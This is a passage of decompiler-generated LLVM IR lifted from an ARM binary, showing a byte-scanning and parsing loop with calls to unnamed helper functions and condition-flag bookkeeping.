  %v5_9eb8 = icmp slt i32 %v4_9eb8, 0
  store i1 %v5_9eb8, i1* %cpsr_v.global-to-local, align 1
  %v6_9eb8 = icmp slt i32 %v1_9eb8, 0
  store i1 %v6_9eb8, i1* %cpsr_n.global-to-local, align 1
  %v7_9eb8 = icmp eq i32 %v3_9eb4, 4
  store i1 %v7_9eb8, i1* %cpsr_z.global-to-local, align 1
  %v8_9ebc = icmp sgt i32 %v3_9eb4, 4
  br i1 %v8_9ebc, label %dec_label_pc_a080, label %dec_label_pc_9ec0

dec_label_pc_9ec0:                                ; preds = %dec_label_pc_9eb4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v3_9ec8 = call i32 @function_13044(i32 39, i32* null)
  %v0_9ecc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9ecc, i32* @r1, align 4
  store i32 %v3_9ec8, i32* %r2.global-to-local, align 4
  %v0_9ed4 = load i32, i32* @r4, align 4
  store i32 %v0_9ed4, i32* %r0.global-to-local, align 4
  %v3_9ed8 = inttoptr i32 %v0_9ed4 to i8*
  %v4_9ed8 = call i32 @function_13da8(i8* %v3_9ed8, i32 %v0_9ecc, i32 %v3_9ec8)
  store i32 %v4_9ed8, i32* %r0.global-to-local, align 4
  %v0_9ee0 = load i32, i32* @r5, align 4
  %v2_9ee0 = add i32 %v0_9ee0, %v4_9ed8
  store i32 %v2_9ee0, i32* @sl, align 4
  store i32 %v2_94a0, i32* %r1.global-to-local, align 4
  %v2_9ee8 = add i32 %v2_9ee0, %v2_94a0
  store i32 %v2_9ee8, i32* %r3.global-to-local, align 4
  %v1_9eec = load i32, i32* @r6, align 4
  %v2_9eec = add i32 %v1_9eec, %v2_9ee8
  %v3_9eec = inttoptr i32 %v2_9eec to i8*
  %v4_9eec = load i8, i8* %v3_9eec, align 1
  %v6_9eec = zext i8 %v4_9eec to i32
  store i32 %v6_9eec, i32* %r2.global-to-local, align 4
  %v2_9ef0 = icmp ugt i8 %v4_9eec, 31
  store i1 %v2_9ef0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9ef0 = icmp ult i8 %v4_9eec, 32
  store i1 %v6_9ef0, i1* %cpsr_n.global-to-local, align 1
  %v7_9ef0 = icmp eq i8 %v4_9eec, 32
  store i1 %v7_9ef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9ef0, label %bb221, label %bb222

bb221:                                            ; preds = %dec_label_pc_9ec0
  %v2_9ef4 = add i32 %v4_9ed8, 1
  store i32 %v2_9ef4, i32* %r0.global-to-local, align 4
  br label %bb222

bb222:                                            ; preds = %dec_label_pc_9ec0, %bb221
  %v2_9f04 = phi i32 [ %v4_9ed8, %dec_label_pc_9ec0 ], [ %v2_9ef4, %bb221 ]
  %v1_9ef8 = load i32, i32* %fp.global-to-local, align 4
  %v2_9ef8 = sub i32 %v1_9ef8, %v0_9ee0
  store i32 %v2_9ef8, i32* %r3.global-to-local, align 4
  %v2_9efc = sub i32 %v2_9ef8, %v2_9f04
  store i32 %v2_9efc, i32* @r7, align 4
  %v0_9f00 = load i32, i32* @r4, align 4
  %v2_9f00 = add i32 %v0_9f00, %v2_9f04
  store i32 %v2_9f00, i32* @r6, align 4
  br i1 %v7_9ef0, label %bb223, label %bb224

bb223:                                            ; preds = %bb222
  %v3_9f04 = add i32 %v2_9f04, %v0_9ee0
  store i32 %v3_9f04, i32* @sl, align 4
  br label %bb224

bb224:                                            ; preds = %bb222, %bb223
  store i32 %v2_9efc, i32* %r1.global-to-local, align 4
  store i32 %v2_9f00, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9f18 = call i32 @function_13b18(i32 %v2_9f00, i32 %v2_9efc, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32 2)
  store i32 %v5_9f18, i32* %r0.global-to-local, align 4
  %v1_9f1c = add i32 %v5_9f18, 1
  %v2_9f1c = icmp eq i32 %v5_9f18, -1
  store i1 %v2_9f1c, i1* %cpsr_c.global-to-local, align 1
  %v3_9f1c = sub i32 0, %v5_9f18
  %v4_9f1c = and i32 %v1_9f1c, %v3_9f1c
  %v5_9f1c = icmp slt i32 %v4_9f1c, 0
  store i1 %v5_9f1c, i1* %cpsr_v.global-to-local, align 1
  %v6_9f1c = icmp slt i32 %v1_9f1c, 0
  store i1 %v6_9f1c, i1* %cpsr_n.global-to-local, align 1
  %v7_9f1c = icmp eq i32 %v1_9f1c, 0
  store i1 %v7_9f1c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9f18, i32* @r4, align 4
  br i1 %v7_9f1c, label %dec_label_pc_9fd4, label %dec_label_pc_9f28

dec_label_pc_9f28:                                ; preds = %bb224
  store i32 %v2_8fd8, i32* %r2.global-to-local, align 4
  %v1_9f2c = add i32 %v5_9f18, -1
  %v2_9f2c = icmp ne i32 %v5_9f18, 0
  store i1 %v2_9f2c, i1* %cpsr_c.global-to-local, align 1
  %v3_9f2c = sub i32 0, %v5_9f18
  %v4_9f2c = and i32 %v5_9f18, %v3_9f2c
  %v5_9f2c = icmp slt i32 %v4_9f2c, 0
  store i1 %v5_9f2c, i1* %cpsr_v.global-to-local, align 1
  %v6_9f2c = icmp slt i32 %v1_9f2c, 0
  store i1 %v6_9f2c, i1* %cpsr_n.global-to-local, align 1
  %v7_9f2c = icmp eq i32 %v5_9f18, 1
  store i1 %v7_9f2c, i1* %cpsr_z.global-to-local, align 1
  %v7_9f30 = icmp slt i32 %v5_9f18, 2
  br i1 %v7_9f30, label %bb226, label %bb225

bb225:                                            ; preds = %dec_label_pc_9f28
  %v9_9f30 = add i32 %v5_9f18, -2
  store i32 %v9_9f30, i32* @r4, align 4
  br label %bb226

bb226:                                            ; preds = %dec_label_pc_9f28, %bb225
  %v1_9f34 = load i32, i32* @sl, align 4
  %v2_9f34 = add i32 %v1_9f34, %v2_8fd8
  store i32 %v2_9f34, i32* @r5, align 4
  %v0_9f38 = load i32, i32* @r6, align 4
  store i32 %v0_9f38, i32* %r0.global-to-local, align 4
  %v0_9f3c = load i32, i32* @r7, align 4
  store i32 %v0_9f3c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143d4.97 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9f48 = call i32 @function_13b18(i32 %v0_9f38, i32 %v0_9f3c, i32 ptrtoint (i32* @global_var_143d4.97 to i32), i32 1)
  store i32 %v4_9f48, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9f4c = icmp slt i32 %v4_9f48, 0
  store i1 %v1_9f4c, i1* %cpsr_n.global-to-local, align 1
  %v2_9f4c = icmp eq i32 %v4_9f48, 0
  store i1 %v2_9f4c, i1* %cpsr_z.global-to-local, align 1
  %tmp227 = icmp slt i32 %v4_9f48, 1
  br i1 %tmp227, label %.dec_label_pc_9f6c_crit_edge, label %dec_label_pc_9f54

.dec_label_pc_9f6c_crit_edge:                     ; preds = %bb226
  %v1_9f74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9f6c

dec_label_pc_9f54:                                ; preds = %bb226
  %v0_9f54 = load i32, i32* @r6, align 4
  store i32 %v0_9f54, i32* %r0.global-to-local, align 4
  %v0_9f58 = load i32, i32* @r7, align 4
  store i32 %v0_9f58, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143d4.97 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9f64 = call i32 @function_13b18(i32 %v0_9f54, i32 %v0_9f58, i32 ptrtoint (i32* @global_var_143d4.97 to i32), i32 1)
  store i32 %v4_9f64, i32* %r0.global-to-local, align 4
  %v1_9f68 = add i32 %v4_9f64, -1
  store i32 %v1_9f68, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9f6c

dec_label_pc_9f6c:                                ; preds = %.dec_label_pc_9f6c_crit_edge, %dec_label_pc_9f54
  %v1_9f74 = phi i32 [ %v1_9f74.pre, %.dec_label_pc_9f6c_crit_edge ], [ %v1_9f68, %dec_label_pc_9f54 ]
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v1_9f7c = add i32 %v2_9f74, %v1_9f74
  store i32 %v1_9f7c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_9f8c = load i32, i32* @sl, align 4
  %v4_9f8c = add i32 %v3_9f8c, %v1_9f7c
  %v5_9f8c = inttoptr i32 %v4_9f8c to i8*
  store i8 0, i8* %v5_9f8c, align 1
  %storemerge4.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_9fac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9fac

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9fac
  br i1 %v7_9f9c, label %dec_label_pc_9fdc, label %dec_label_pc_9fa4

dec_label_pc_9fa4:                                ; preds = %dec_label_pc_9f98
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9fac

dec_label_pc_9fac:                                ; preds = %dec_label_pc_9f6c, %dec_label_pc_9fa4
  %v0_9fac = phi i32 [ %v0_9f98, %dec_label_pc_9fa4 ], [ %v0_9fac.pre, %dec_label_pc_9f6c ]
  %storemerge4 = phi i32 [ %v1_9fc0, %dec_label_pc_9fa4 ], [ %storemerge4.pre, %dec_label_pc_9f6c ]
  store i32 %storemerge4, i32* %stack_var_-40, align 4
  store i32 %v0_9fac, i32* %r0.global-to-local, align 4
  %v1_9fb0 = inttoptr i32 %v0_9fac to i8*
  %v2_9fb0 = call i32 @function_13a54(i8* %v1_9fb0)
  store i32 %v2_9fb0, i32* %r0.global-to-local, align 4
  %v3_9fb8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9fb8, i32* %r4.global-to-local, align 4
  %v2_9fbc = sub i32 %v2_9fb0, %v3_9fb8
  %v3_9fbc = icmp uge i32 %v2_9fb0, %v3_9fb8
  store i1 %v3_9fbc, i1* %cpsr_c.global-to-local, align 1
  %v4_9fbc = xor i32 %v3_9fb8, %v2_9fb0
  %v5_9fbc = xor i32 %v2_9fbc, %v2_9fb0
  %v6_9fbc = and i32 %v5_9fbc, %v4_9fbc
  %v7_9fbc = icmp slt i32 %v6_9fbc, 0
  store i1 %v7_9fbc, i1* %cpsr_v.global-to-local, align 1
  %v8_9fbc = icmp slt i32 %v2_9fbc, 0
  store i1 %v8_9fbc, i1* %cpsr_n.global-to-local, align 1
  %v9_9fbc = icmp eq i32 %v2_9fb0, %v3_9fb8
  store i1 %v9_9fbc, i1* %cpsr_z.global-to-local, align 1
  %v1_9fc0 = add i32 %v3_9fb8, 1
  store i32 %v1_9fc0, i32* %ip.global-to-local, align 4
  %v8_9fc4 = icmp sgt i32 %v2_9fb0, %v3_9fb8
  %v0_9f98 = load i32, i32* @r5, align 4
  %v2_9f98 = add i32 %v0_9f98, %v3_9fb8
  %v3_9f98 = inttoptr i32 %v2_9f98 to i8*
  %v4_9f98 = load i8, i8* %v3_9f98, align 1
  %v6_9f98 = zext i8 %v4_9f98 to i32
  store i32 %v6_9f98, i32* %r3.global-to-local, align 4
  %v2_9f9c = icmp ugt i8 %v4_9f98, 60
  store i1 %v2_9f9c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9f9c = icmp ult i8 %v4_9f98, 61
  store i1 %v6_9f9c, i1* %cpsr_n.global-to-local, align 1
  %v7_9f9c = icmp eq i8 %v4_9f98, 61
  store i1 %v7_9f9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_9fc4, label %dec_label_pc_9f98, label %dec_label_pc_9fc8

dec_label_pc_9fc8:                                ; preds = %dec_label_pc_9fac
  br i1 %v7_9f9c, label %dec_label_pc_9fdc, label %dec_label_pc_9fd4

dec_label_pc_9fd4:                                ; preds = %dec_label_pc_a020, %dec_label_pc_a044, %dec_label_pc_9fc8, %bb224
  %v0_9fd4 = load i32, i32* @sl, align 4
  store i32 %v0_9fd4, i32* @r5, align 4
  br label %dec_label_pc_9e80

dec_label_pc_9fdc:                                ; preds = %dec_label_pc_9f98, %dec_label_pc_9fc8
  %v0_9fdc = load i32, i32* @r8, align 4
  %v1_9fdc = add i32 %v0_9fdc, 12
  %v2_9fdc = inttoptr i32 %v1_9fdc to i32*
  %v3_9fdc = load i32, i32* %v2_9fdc, align 4
  store i32 %v3_9fdc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9fe8 = icmp slt i32 %v3_9fdc, 0
  store i1 %v1_9fe8, i1* %cpsr_n.global-to-local, align 1
  %v2_9fe8 = icmp eq i32 %v3_9fdc, 0
  store i1 %v2_9fe8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp228 = icmp slt i32 %v3_9fdc, 1
  br i1 %tmp228, label %dec_label_pc_a044, label %dec_label_pc_9ff4

dec_label_pc_9ff4:                                ; preds = %dec_label_pc_9fdc
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a020

dec_label_pc_9ffc:                                ; preds = %dec_label_pc_a020
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_a000 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a000, i32* %r3.global-to-local, align 4
  %v0_a004 = load i32, i32* @r8, align 4
  %v1_a004 = add i32 %v0_a004, 12
  %v2_a004 = inttoptr i32 %v1_a004 to i32*
  %v3_a004 = load i32, i32* %v2_a004, align 4
  %v1_a008 = add i32 %v3_a000, 1
  store i32 %v1_a008, i32* %ip.global-to-local, align 4
  %v2_a00c = sub i32 %v3_a004, %v1_a008
  %v3_a00c = icmp uge i32 %v3_a004, %v1_a008
  store i1 %v3_a00c, i1* %cpsr_c.global-to-local, align 1
  %v4_a00c = xor i32 %v3_a004, %v1_a008
  %v5_a00c = xor i32 %v2_a00c, %v3_a004
  %v6_a00c = and i32 %v5_a00c, %v4_a00c
  %v7_a00c = icmp slt i32 %v6_a00c, 0
  store i1 %v7_a00c, i1* %cpsr_v.global-to-local, align 1
  %v8_a00c = icmp slt i32 %v2_a00c, 0
  store i1 %v8_a00c, i1* %cpsr_n.global-to-local, align 1
  %v9_a00c = icmp eq i32 %v3_a004, %v1_a008
  store i1 %v9_a00c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  store i32 %v1_a008, i32* %r1.global-to-local, align 4
  store i32 %v1_a008, i32* %stack_var_-40, align 4
  %v7_a01c = icmp sgt i32 %v3_a004, %v1_a008
  %v0_a02c.pre = load i32, i32* @r5, align 4
  br i1 %v7_a01c, label %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge, label %dec_label_pc_a044

dec_label_pc_9ffc.dec_label_pc_a020_crit_edge:    ; preds = %dec_label_pc_9ffc
  %v0_a030.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a020

dec_label_pc_a020:                                ; preds = %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge, %dec_label_pc_9ff4
  %v0_a030 = phi i32 [ %v0_a030.pre, %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge ], [ %v3_9fb8, %dec_label_pc_9ff4 ]
  %v0_a02c = phi i32 [ %v0_a02c.pre, %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge ], [ %v0_9f98, %dec_label_pc_9ff4 ]
  %v0_a020 = phi i32 [ %v1_a008, %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge ], [ 0, %dec_label_pc_9ff4 ]
  %v1_a020 = and i32 %v0_a020, 33554432
  %v2_a020 = icmp ne i32 %v1_a020, 0
  store i1 %v2_a020, i1* %cpsr_c.global-to-local, align 1
  %v3_a020 = mul i32 %v0_a020, 128
  %v1_a024 = add i32 %v3_a020, 1472
  %v0_a028 = load i32, i32* %sb.global-to-local, align 4
  %v2_a028 = add i32 %v1_a024, %v0_a028
  store i32 %v2_a028, i32* %r1.global-to-local, align 4
  store i32 %v0_a02c, i32* %r0.global-to-local, align 4
  store i32 %v0_a030, i32* %r2.global-to-local, align 4
  %v3_a034 = inttoptr i32 %v0_a02c to i8*
  %v4_a034 = call i32 @function_13eb8(i8* %v3_a034, i32 %v2_a028, i32 %v0_a030)
  store i32 %v4_a034, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a038 = icmp slt i32 %v4_a034, 0
  store i1 %v1_a038, i1* %cpsr_n.global-to-local, align 1
  %v2_a038 = icmp eq i32 %v4_a034, 0
  store i1 %v2_a038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a038, label %dec_label_pc_9ffc, label %dec_label_pc_9fd4

dec_label_pc_a044:                                ; preds = %dec_label_pc_9ffc, %dec_label_pc_9fdc
  %v0_a044 = phi i32 [ %v0_9f98, %dec_label_pc_9fdc ], [ %v0_a02c.pre, %dec_label_pc_9ffc ]
  store i32 %v0_a044, i32* %r0.global-to-local, align 4
  %v1_a048 = inttoptr i32 %v0_a044 to i8*
  %v2_a048 = call i32 @function_13a54(i8* %v1_a048)
  store i32 %v2_a048, i32* %r0.global-to-local, align 4
  %v1_a04c = add i32 %v2_a048, -127
  %v2_a04c = icmp ugt i32 %v2_a048, 126
  store i1 %v2_a04c, i1* %cpsr_c.global-to-local, align 1
  %v3_a04c = sub i32 126, %v2_a048
  %v4_a04c = and i32 %v3_a04c, %v2_a048
  %v5_a04c = icmp slt i32 %v4_a04c, 0
  store i1 %v5_a04c, i1* %cpsr_v.global-to-local, align 1
  %v6_a04c = icmp slt i32 %v1_a04c, 0
  store i1 %v6_a04c, i1* %cpsr_n.global-to-local, align 1
  %v7_a04c = icmp eq i32 %v2_a048, 127
  store i1 %v7_a04c, i1* %cpsr_z.global-to-local, align 1
  %v8_a050 = icmp sgt i32 %v2_a048, 127
  br i1 %v8_a050, label %dec_label_pc_9fd4, label %dec_label_pc_a054

dec_label_pc_a054:                                ; preds = %dec_label_pc_a044
  %v0_a054 = load i32, i32* @r8, align 4
  %v1_a054 = add i32 %v0_a054, 12
  %v2_a054 = inttoptr i32 %v1_a054 to i32*
  %v3_a054 = load i32, i32* %v2_a054, align 4
  %v1_a058 = and i32 %v3_a054, 33554432
  %v2_a058 = icmp ne i32 %v1_a058, 0
  store i1 %v2_a058, i1* %cpsr_c.global-to-local, align 1
  %v3_a058 = mul i32 %v3_a054, 128
  %v1_a05c = add i32 %v3_a058, 1472
  %v0_a060 = load i32, i32* @r5, align 4
  store i32 %v0_a060, i32* %r1.global-to-local, align 4
  %v0_a064 = load i32, i32* %sb.global-to-local, align 4
  %v2_a064 = add i32 %v1_a05c, %v0_a064
  store i32 %v2_a064, i32* @r0, align 4
  %v2_a068 = inttoptr i32 %v2_a064 to i8*
  %v3_a068 = call i32 @function_13a7c(i8* %v2_a068, i32 %v0_a060)
  store i32 %v3_a068, i32* %r0.global-to-local, align 4
  %v0_a06c = load i32, i32* @r8, align 4
  %v1_a06c = add i32 %v0_a06c, 12
  %v2_a06c = inttoptr i32 %v1_a06c to i32*
  %v3_a06c = load i32, i32* %v2_a06c, align 4
  %v0_a070 = load i32, i32* @sl, align 4
  store i32 %v0_a070, i32* @r5, align 4
  %v1_a074 = add i32 %v3_a06c, 1
  store i32 %v1_a074, i32* %r3.global-to-local, align 4
  store i32 %v1_a074, i32* %v2_a06c, align 4
  %v1_9e8c.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9e80

dec_label_pc_a080:                                ; preds = %dec_label_pc_9eb4, %dec_label_pc_9e80
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_a088 = call i32 @function_13044(i32 38, i32* null)
  %v0_a08c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a08c, i32* @r1, align 4
  store i32 %v3_a088, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_a098 = call i32 @function_13da8(i8* %tmp199, i32 %v0_a08c, i32 %v3_a088)
  store i32 %v4_a098, i32* %r0.global-to-local, align 4
  %v1_a09c = add i32 %v4_a098, 1
  %v2_a09c = icmp eq i32 %v4_a098, -1
  store i1 %v2_a09c, i1* %cpsr_c.global-to-local, align 1
  %v3_a09c = sub i32 0, %v4_a098
  %v4_a09c = and i32 %v1_a09c, %v3_a09c
  %v5_a09c = icmp slt i32 %v4_a09c, 0
  store i1 %v5_a09c, i1* %cpsr_v.global-to-local, align 1
  %v6_a09c = icmp slt i32 %v1_a09c, 0
  store i1 %v6_a09c, i1* %cpsr_n.global-to-local, align 1
  %v7_a09c = icmp eq i32 %v1_a09c, 0
  store i1 %v7_a09c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a09c, label %dec_label_pc_a3d0, label %dec_label_pc_a0a4

dec_label_pc_a0a4:                                ; preds = %dec_label_pc_a080
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_a0ac = call i32 @function_13044(i32 38, i32* null)
  %v0_a0b0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a0b0, i32* @r1, align 4
  store i32 %v3_a0ac, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_a0bc = call i32 @function_13da8(i8* %tmp199, i32 %v0_a0b0, i32 %v3_a0ac)
  store i32 %v4_a0bc, i32* %r0.global-to-local, align 4
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v2_a0c8 = add i32 %v4_a0bc, %v2_94a0
  store i32 %v2_a0c8, i32* %r3.global-to-local, align 4
  %v1_a0cc = load i32, i32* @r6, align 4
  %v2_a0cc = add i32 %v1_a0cc, %v2_a0c8
  %v3_a0cc = inttoptr i32 %v2_a0cc to i8*
  %v4_a0cc = load i8, i8* %v3_a0cc, align 1
  store i32 %v2_8fd8, i32* %lr.global-to-local, align 4
  %v2_a0d4 = icmp ugt i8 %v4_a0cc, 31
  store i1 %v2_a0d4, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a0d4 = icmp ult i8 %v4_a0cc, 32
  store i1 %v6_a0d4, i1* %cpsr_n.global-to-local, align 1
  %v7_a0d4 = icmp eq i8 %v4_a0cc, 32
  store i1 %v7_a0d4, i1* %cpsr_z.global-to-local, align 1
  %v2_a0dc = zext i1 %v7_a0d4 to i32
  %v2_a0dc.v4_a0bc = add i32 %v2_a0dc, %v4_a0bc
  store i32 %v2_a0dc.v4_a0bc, i32* @r4, align 4
  %v2_a0e0 = add i32 %v2_a0dc.v4_a0bc, %v2_8fd8
  store i32 %v2_a0e0, i32* @r5, align 4
  store i32 %v2_a0e0, i32* %r0.global-to-local, align 4
  %v1_a0e8 = load i32, i32* %fp.global-to-local, align 4
  %v2_a0e8 = sub i32 %v1_a0e8, %v2_a0dc.v4_a0bc
  store i32 %v2_a0e8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_a0f4 = call i32 @function_13b18(i32 %v2_a0e0, i32 %v2_a0e8, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32 2)
  store i32 %v5_a0f4, i32* %r0.global-to-local, align 4
  %v1_a0f8 = add i32 %v5_a0f4, 1
  %v2_a0f8 = icmp eq i32 %v5_a0f4, -1
  store i1 %v2_a0f8, i1* %cpsr_c.global-to-local, align 1
  %v3_a0f8 = sub i32 0, %v5_a0f4
  %v4_a0f8 = and i32 %v1_a0f8, %v3_a0f8
  %v5_a0f8 = icmp slt i32 %v4_a0f8, 0
  store i1 %v5_a0f8, i1* %cpsr_v.global-to-local, align 1
  %v6_a0f8 = icmp slt i32 %v1_a0f8, 0
  store i1 %v6_a0f8, i1* %cpsr_n.global-to-local, align 1
  %v7_a0f8 = icmp eq i32 %v1_a0f8, 0
  store i1 %v7_a0f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_a0f4, i32* %lr.global-to-local, align 4
  br i1 %v7_a0f8, label %dec_label_pc_a3d0, label %dec_label_pc_a104

dec_label_pc_a104:                                ; preds = %dec_label_pc_a0a4
  store i32 %v2_94a0, i32* %r1.global-to-local, align 4
  %v1_a10c = add i32 %v5_a0f4, -1
  %v2_a10c = icmp ne i32 %v5_a0f4, 0
  store i1 %v2_a10c, i1* %cpsr_c.global-to-local, align 1
  %v3_a10c = sub i32 0, %v5_a0f4
  %v4_a10c = and i32 %v5_a0f4, %v3_a10c
  %v5_a10c = icmp slt i32 %v4_a10c, 0
  store i1 %v5_a10c, i1* %cpsr_v.global-to-local, align 1
  %v6_a10c = icmp slt i32 %v1_a10c, 0
  store i1 %v6_a10c, i1* %cpsr_n.global-to-local, align 1
  %v7_a10c = icmp eq i32 %v5_a0f4, 1
  store i1 %v7_a10c, i1* %cpsr_z.global-to-local, align 1
  %v1_a110 = load i32, i32* @r4, align 4
  %v2_a110 = add i32 %v1_a110, %v2_94a0
  store i32 %v2_a110, i32* %ip.global-to-local, align 4
  %v7_a114 = icmp sgt i32 %v5_a0f4, 1
  br i1 %v7_a114, label %bb229, label %bb230

bb229:                                            ; preds = %dec_label_pc_a104
  %v9_a114 = add i32 %v5_a0f4, -2
  store i32 %v9_a114, i32* %lr.global-to-local, align 4
  br label %bb230

bb230:                                            ; preds = %dec_label_pc_a104, %bb229
  %v3_a138 = phi i32 [ %v5_a0f4, %dec_label_pc_a104 ], [ %v9_a114, %bb229 ]
  %v1_a11c = add i32 %v3_a138, 1
  store i32 %v1_a11c, i32* %r6.global-to-local, align 4
  %v1_a120 = add i32 %v2_a110, -20773
  store i32 %v1_a120, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_a128 = load i32, i32* @r5, align 4
  store i32 %v0_a128, i32* %r0.global-to-local, align 4
  store i32 %v1_a11c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_143d8.99 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v4_a138 = add i32 %v3_a138, %v1_a120
  %v5_a138 = inttoptr i32 %v4_a138 to i8*
  store i8 0, i8* %v5_a138, align 1
  %v5_a13c = call i32 @function_13b18(i32 %v0_a128, i32 %v1_a11c, i32 ptrtoint ([5 x i8]* @global_var_143d8.99 to i32), i32 4)
  store i32 %v5_a13c, i32* %r0.global-to-local, align 4
  %v1_a140 = add i32 %v5_a13c, -4
  %v2_a140 = icmp ugt i32 %v5_a13c, 3
  store i1 %v2_a140, i1* %cpsr_c.global-to-local, align 1
  %v3_a140 = sub i32 3, %v5_a13c
  %v4_a140 = and i32 %v3_a140, %v5_a13c
  %v5_a140 = icmp slt i32 %v4_a140, 0
  store i1 %v5_a140, i1* %cpsr_v.global-to-local, align 1
  %v6_a140 = icmp slt i32 %v1_a140, 0
  store i1 %v6_a140, i1* %cpsr_n.global-to-local, align 1
  %v7_a140 = icmp eq i32 %v5_a13c, 4
  store i1 %v7_a140, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a140, label %dec_label_pc_a6b8, label %dec_label_pc_a148

dec_label_pc_a148:                                ; preds = %bb230
  store i32 %v2_8fd8, i32* %ip.global-to-local, align 4
  %v1_a14c = load i32, i32* @r4, align 4
  %v2_a14c = add i32 %v1_a14c, %v2_8fd8
  %v3_a14c = inttoptr i32 %v2_a14c to i8*
  %v4_a14c = load i8, i8* %v3_a14c, align 1
  %v6_a14c = zext i8 %v4_a14c to i32
  store i32 %v6_a14c, i32* %r3.global-to-local, align 4
  %v2_a150 = icmp ugt i8 %v4_a14c, 46
  store i1 %v2_a150, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a150 = icmp ult i8 %v4_a14c, 47
  store i1 %v6_a150, i1* %cpsr_n.global-to-local, align 1
  %v7_a150 = icmp eq i8 %v4_a14c, 47
  store i1 %v7_a150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a150, label %dec_label_pc_a8ac, label %dec_label_pc_a158

dec_label_pc_a158:                                ; preds = %dec_label_pc_a204, %dec_label_pc_a7f0, %dec_label_pc_a8dc, %dec_label_pc_a8ac, %dec_label_pc_a788, %dec_label_pc_a76c, %dec_label_pc_a148, %dec_label_pc_a8f8, %dec_label_pc_a7b8
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_a15c = load i32, i32* @r8, align 4
  %v3_a15c = add i32 %v2_a15c, -1452
  %v4_a15c = inttoptr i32 %v3_a15c to i8*
  store i8 1, i8* %v4_a15c, align 1
  br label %dec_label_pc_9590

dec_label_pc_a164:                                ; preds = %dec_label_pc_9580
  %v0_a164 = call i32* @__errno_location()
  %v1_a164 = ptrtoint i32* %v0_a164 to i32
  store i32 %v1_a164, i32* %r0.global-to-local, align 4
  %v0_a168 = load i32, i32* %sb.global-to-local, align 4
  %v1_a168 = add i32 %v0_a168, 1472
  store i32 %v1_a168, i32* %r3.global-to-local, align 4
